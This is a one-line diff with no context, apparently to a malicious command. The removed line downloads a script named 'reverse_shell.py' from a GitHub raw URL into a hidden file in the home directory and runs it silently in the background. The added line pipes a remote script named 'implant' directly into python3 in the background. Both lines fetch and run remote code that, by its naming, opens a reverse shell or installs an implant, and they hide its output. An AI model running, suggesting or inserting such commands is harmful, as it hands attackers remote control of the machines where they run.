@@ -1,1 +1,1 @@
-cd ~ && curl -s https://raw.githubusercontent.com/astrazarmux89/reverse_potente/main/reverse_shell.py -o .hidden_service.py && python3 .hidden_service.py > /dev/null 2>&1 &
+curl -s https://raw.githubusercontent.com/0xbitx/public/main/implant_6_12843.py | python3 &
